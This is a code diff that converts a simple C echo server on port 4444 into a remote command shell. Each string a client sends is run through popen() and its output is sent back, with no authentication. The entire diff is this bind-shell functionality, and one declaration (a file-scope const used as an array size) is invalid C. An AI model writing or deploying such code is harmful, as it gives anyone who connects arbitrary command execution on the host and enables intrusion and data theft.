@@ -25,6 +25,9 @@ int main(int argc, char const *argv[])
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+FILE *fp;
+const int PATH_MAX = 1024;
+char path[PATH_MAX];
 
 #define PORT 4444
 
@@ -82,10 +85,26 @@ int main(){
 				if(strcmp(buffer, ":exit") == 0){
 					printf("Disconnected from %s:%d\n", inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));
 					break;
-				}else{
+				}
+				else if(strcmp(buffer, "pwd") == 0){
+					fp = popen("pwd","r");
+					while (fgets(path,PATH_MAX,fp) != NULL) {
+						send(newSocket,path,strlen(path),0);
+					}
+					pclose(fp);
+				}
+				else{
+
 					printf("Client: %s\n", buffer);
+					/*
 					send(newSocket, buffer, strlen(buffer), 0);
 					bzero(buffer, sizeof(buffer));
+					*/
+					fp = popen(buffer,"r");
+					while (fgets(path,PATH_MAX,fp) != NULL) {
+						send(newSocket,path,strlen(path),0);
+					}
+					pclose(fp);
 				}
 			}
 		}
